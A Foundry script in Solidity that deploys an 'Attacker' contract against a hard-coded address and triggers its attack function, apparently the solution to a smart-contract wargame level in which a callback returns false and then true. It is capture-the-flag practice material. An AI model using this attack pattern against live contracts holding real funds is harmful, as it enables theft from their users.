// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level11.sol";
import "../src/Level11-Attacker.sol";

contract AttackerScript is Script {
    Level11 public level11;
    Attacker public attacker;

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      //Deploy Attacker and trigger it, first check return false then return true to trigger the top on the contract
      attacker = new Attacker(0x732335e28733FB7631bf9123013c7263991bA8de);
      attacker.attack();
      vm.stopBroadcast();
    }
}
